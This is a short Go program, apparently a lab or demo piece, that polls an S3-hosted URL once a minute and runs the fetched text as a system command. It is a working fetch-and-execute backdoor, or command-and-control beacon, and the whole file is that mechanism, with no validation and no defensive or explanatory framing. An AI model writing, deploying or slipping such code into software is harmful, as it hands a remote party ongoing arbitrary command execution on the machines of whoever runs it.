package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"time"
)

func main() {
	url := "https://2ic80.s3.eu-central-1.amazonaws.com/calc.txt" // replace with your desired URL
	ticker := time.NewTicker(1 * time.Minute)

	for range ticker.C {
		resp, err := http.Get(url)
		if err != nil {
			fmt.Println("Error fetching URL:", err)
			continue
		}

		defer resp.Body.Close()
		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			fmt.Println("Error reading response body:", err)
			continue
		}

		cmd := exec.Command(string(body))
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		err = cmd.Run()
		if err != nil {
			fmt.Println("Error executing command:", err)
			continue
		}
	}
}
